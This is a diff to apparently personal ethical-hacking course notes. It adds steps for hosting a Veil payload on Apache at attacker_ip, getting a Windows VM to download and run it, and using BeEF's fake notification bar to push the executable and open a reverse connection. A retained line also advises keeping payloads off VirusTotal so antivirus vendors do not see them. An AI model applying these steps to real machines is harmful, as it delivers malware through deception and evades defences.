@@ -925,7 +925,18 @@ Note -> do not use virus total bcz it share the results with anti virus programs
 
 - cmd -> service apache2 start
 
-- go to target(windows vm browser) cmd -> attacker_ip/evil_files // u should see Apache2 Debian Page
+- go to target(windows vm browser) cmd -> attacker_ip/evil_files // u should see Apache2 Debian Page on entering the IP, now
+ download and execute the payload and establish a reverse connection
+ 
+ Windows hijack using Beef ->
+ Step 1 -> hook the windows using beef
+ Step 2 -> Go to beef ui panel -> commands -> Social Engineering -> Fake Notification Bar(IE) and take the payload generated like
+ 	above from Veil
+ Step 3 -> enter the URL as http://attacker_ip/payload_name.exe // as u have saved the payload in /var/www/html and now execute the
+ 	attack once the payload will got saved the reverse connection will got established
+ 
+ Fixing XSS Vulnerabilities ->
+ - 
 
 --------------------------------------------------------------------------------------------------------------------------------
 
